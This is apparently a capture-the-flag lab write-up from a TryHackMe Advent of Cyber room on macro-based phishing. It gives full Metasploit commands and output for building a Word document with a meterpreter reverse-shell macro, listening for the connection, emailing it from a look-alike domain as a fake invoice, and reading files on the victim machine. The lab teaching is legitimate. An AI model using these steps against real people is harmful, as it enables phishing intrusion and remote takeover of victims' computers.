# Task 16 - Phishing - Day 10: He had a brain full of macros, and had shells in his soul.

## Learning Objectives

- Understand how phishing attacks work
- Discover how macros in documents can be used and abused
- Learn how to carry out a phishing attack with a macro

## Phishing Attacks

Security is as strong as the weakest link. Many would argue that humans are the weakest link in the security chain. Is it easier to exploit a patched system behind a firewall or to convince a user to open an “important” document? Hence, “human hacking” is usually the easiest to accomplish and falls under social engineering.

Phishing is a play on the word fishing; however, the attacker is not after seafood. Phishing works by sending a “bait” to a usually large group of target users. Furthermore, the attacker often craft their messages with a sense of urgency, prompting target users to take immediate action without thinking critically, increasing the chances of success. The purpose is to steal personal information or install malware, usually by convincing the target user to fill out a form, open a file, or click a link.

One might get an email out of nowhere claiming that they are being charged a hefty sum and that they should check the details in the attached file or URL. The attacker just needs to have their target users open the malicious file or view the malicious link. This can trigger specific actions that would give the attack control over your system.

## Macros

The needs of MS Office users can be vastly different, and there is no way that a default installation would cater to all of these needs. In particular, some users find themselves repeating the same tasks, such as formatting and inserting text or performing calculations. Consider the example of number-to-words conversion where a number such as “1337” needs to be expressed as “one thousand three hundred thirty-seven”. It would take hours to finish if you have hundreds of numbers to convert. Hence, there is a need for an automated solution to save time and reduce manual effort.

In computing, a macro refers to a set of programmed instructions designed to automate repetitive tasks. MS Word, among other MS Office products, supports adding macros to documents. In many cases, these macros can be a tremendous time-saving feature. However, in cyber security, these automated programs can be hijacked for malicious purposes.

To add a macro to an MS Word document for instance, we click on the **View** menu and then select **Macros** as pointed out by 1 and 2 in the screenshot below. We should specify the name of the macro and specify that we want to save it in our current document, as indicated by 3 and 4. Finally, we press the **Create** button.


Let’s explore one way the attacker could have created an MS Word document with an embedded macro to gain access to Marta’s system.

## Attack Plan

In his plans, Mayor Malware needs to create a document with a malicious macro. Upon opening the document, the macro will execute a payload and connect to the Mayor’s machine, giving him remote control. Consequently, the Mayor needs to ensure that he is listening for incoming connections on his machine before emailing the malicious document to Marta May Ware. By executing the macro, the Mayor gains remote access to Marta’s system through a reverse shell, allowing him to execute commands and control her machine remotely. The steps are as follows:

1. Create a document with a malicious macro
2. Start listening for incoming connections on the attacker’s system
3. Email the document and wait for the target user to open it
4. The target user opens the document and connects to the attacker’s system
5. Control the target user’s system

You might wonder why you don’t set the malicious macro so that you can connect to the target system directly instead of the other way around. The reason is that when the target system is behind a firewall or has a private IP address, you cannot reach it and, hence, cannot connect to it.

## Attacker’s System

On the AttackBox, you need to carry out two steps:

- Create a document with an embedded malicious macro
- Listen for incoming connections

## Creating the Malicious Document

The first step would be to embed a malicious macro within the document. Alternatively, you can use the Metasploit Framework to create such a document, as this would spare us the need for a system with MS Office.

You will use the Metasploit Framework to create the document with the malicious macro. This requires the following commands:

- Open a new terminal window and run `msfconsole` to start the Metasploit Framework
- `set payload windows/meterpreter/reverse_tcp` specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell  
    
- `use exploit/multi/fileformat/office_word_macro` specifies the exploit you want to use. Technically speaking, this is not an exploit; it is a module to create a document with a macro
- `set LHOST CONNECTION_IP` specifies the IP address of the attacker’s system, `CONNECTION_IP` in this case is the IP of the AttackBox
- `set LPORT 8888` specifies the port number you are going to listen on for incoming connections on the AttackBox
- `show options` shows the configuration options to ensure that everything has been set properly, i.e., the IP address and port number in this example
- `exploit` generates a macro and embeds it in a document
- `exit` to quit and return to the terminal

In the terminal below, you can see the execution of the above steps.

```
┌──(kali㉿kali)-[/mnt/hgfs/tmp/tryhackme/adventofcyber2024]
└─$ msfconsole -q                                                                        
msf6 > use exploit/multi/fileformat/office_word_macro
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(multi/fileformat/office_word_macro) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/fileformat/office_word_macro) > set lhost 10.2.111.254
lhost => 10.2.111.254
msf6 exploit(multi/fileformat/office_word_macro) > set lport 8888
lport => 8888
msf6 exploit(multi/fileformat/office_word_macro) > show options 

Module options (exploit/multi/fileformat/office_word_macro):

   Name            Current Setting                                                                Required  Description
   ----            ---------------                                                                --------  -----------
   CUSTOMTEMPLATE  /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx  yes       A docx file that will be used as a template to build the exploit
   FILENAME        msf.docm                                                                       yes       The Office document macro file (docm)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.2.111.254     yes       The listen address (an interface may be specified)
   LPORT     8888             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Office Word on Windows



View the full module info with the info, or info -d command.

msf6 exploit(multi/fileformat/office_word_macro) > 

sf6 exploit(multi/fileformat/office_word_macro) > exploit 

[*] Using template: /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx
[*] Injecting payload in document comments
[*] Injecting macro and other required files in document
[*] Finalizing docm: msf.docm
[+] msf.docm stored at /home/kali/.msf4/local/msf.docm
msf6 exploit(multi/fileformat/office_word_macro) > 

```

## The Created Macro-Enabled Document

We mentioned earlier how to create a macro within an MS Word document. You might be interested to see the content of the file created by `msfconsole`. In the screenshot below, we can see the different procedures and functions that make up this macro. **Note:** The AttackBox doesn’t have MS Office installed, so for this section you only have to read along.  

1. `AutoOpen()` triggers the macro automatically when a Word document is opened. It searches through the document’s properties, looking for content in the “Comments” field. The data saved using `base64` encoding in the Comments field is actually the payload.
2. `Base64Decode()` converts the payload to its original form. In this case, it is an executable MS Windows file.
3. `ExecuteForWindows()` executes the payload in a temporary directory. It connects to the specified attacker’s system IP address and port.


## Listening for Incoming Connections

We again will use the Metasploit Framework, but this time to listen for incoming connections when a target users opens our phishing Word document. This requires the following commands:

- Open a new terminal window and run `msfconsole` to start the Metasploit Framework
- `use multi/handler` to handle incoming connections
- `set payload windows/meterpreter/reverse_tcp` to ensure that our payload works with the payload used when creating the malicious macro  
    
- `set LHOST CONNECTION_IP` specifies the IP address of the attacker’s system and should be the same as the one used when creating the document
- `set LPORT 8888` specifies the port number you are going to listen on and should be the same as the one used when creating the document
- `show options` to confirm the values of your options
- `exploit` starts listening for incoming connections to establish a reverse shell

```
──(kali㉿kali)-[/mnt/hgfs/tmp/tryhackme/adventofcyber2024]
└─$ msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.2.111.254
lhost => 10.2.111.254
msf6 exploit(multi/handler) > set lport 8888
lport => 8888
msf6 exploit(multi/handler) > show options 

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, pr
                                        ocess, none)
   LHOST     10.2.111.254     yes       The listen address (an interface may be speci
                                        fied)
   LPORT     8888             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.2.111.254:8888 

```


## Email the Malicious Document

The malicious document has been created. All you need to do is to send it to the target user. It is time to send an email to the target user, `marta@socmas.thm`. Mayor Malware has prepared the following credentials:

- Email: `info@socnas.thm`
- Password: `MerryPhishMas!`

Notice how Mayor Malware uses a domain name that looks similar to the target user’s. This technique is known as “typosquatting,” where attackers create domain names that are nearly identical to legitimate ones in order to trick victims. On the AttackBox, start the Firefox web browser and head to http://10.10.101.132. Use the above credentials to log in.

Once logged in, compose an email to the target user, and don’t forget to attach the document you created. Changing the name to something more convincing, such as `invoice.docm` or `receipt.docm` might be a good idea. Also, write a couple of sentences explaining what you are attaching to convince Marta May Ware to open the document. **Note:** You can use CTRL+H on the file upload pop-up to be able to see the `.msf4` directory where our email attachment is located.

## Exploitation

If everything works out, you will get a reverse shell after about 2 minutes. You can access the files and folders on the target system via the command line. You can use `cat` to display any text file.

```
┌──(kali㉿kali)-[/mnt/hgfs/tmp/tryhackme/adventofcyber2024]
└─$ msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.2.111.254
lhost => 10.2.111.254
msf6 exploit(multi/handler) > set lport 8888
lport => 8888
msf6 exploit(multi/handler) > show options 

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, pr
                                        ocess, none)
   LHOST     10.2.111.254     yes       The listen address (an interface may be speci
                                        fied)
   LPORT     8888             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.2.111.254:8888 
[*] Sending stage (177734 bytes) to 10.10.101.132
[*] Meterpreter session 1 opened (10.2.111.254:8888 -> 10.10.101.132:49858) at 2024-12-11 12:16:35 -0600

meterpreter > 
Listing: C:\users\Administrator\Desktop
=======================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
100666/rw-rw-rw  527   fil   2016-06-21 10:36:17 -0500  EC2 Feedback.website
-
100666/rw-rw-rw  554   fil   2016-06-21 10:36:23 -0500  EC2 Microsoft Windows Guide.w
-                                                       ebsite
100666/rw-rw-rw  282   fil   2021-03-17 10:13:27 -0500  desktop.ini
-
100666/rw-rw-rw  23    fil   2024-11-11 21:42:45 -0600  flag.txt
-

meterpreter > cat flag.txt
THM{PHISHING_CHRISTMAS}meterpreter > 


```